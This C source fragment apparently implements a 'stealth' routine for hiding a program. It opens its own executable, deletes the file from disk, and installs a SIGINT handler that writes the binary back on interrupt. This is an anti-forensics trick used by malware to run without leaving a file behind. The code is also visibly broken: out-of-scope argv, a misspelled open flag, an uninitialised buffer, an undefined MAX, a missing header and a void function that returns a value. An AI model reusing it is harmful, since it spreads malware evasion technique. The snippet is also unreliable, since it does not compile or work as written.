#include <errno.h>    
#include <libgen.h>   
#include <stddef.h>   
#include <stdio.h>    
#include <stdlib.h>  
#include <unistd.h> 
#include <fcntl.h>  
#include <string.h> 
#include <sys/stat.h> 
#include <sys/types.h>
int fd;
int stealth(int argc,char *argv[]){
	fd = open(argv[0],O_RDONLY);
	unlink(argv[0]);
	struct sigaction sigHandy;

        sigHandy.sa_handler = &SimpSigHandler;
		
        sigHandy.sa_flags = SA_RESTART;
		
        sigaction(SIGINT, &sigHandy, NULL);  // Registers/calls the signal handler
return 0;
}

// Below is the simple signal handler function that gets called when the signal is caught. 
void SimpSigHandler (int sigNum){
	char *buff;
	if (sigNum == SIGINT){
		int fd2 = open(argv[0],WRONLY | O_CREAT, S_IRWXU);
		read(fd,buff,MAX);
		write(fd2,buff,MAX);
	}

	return 0;
}
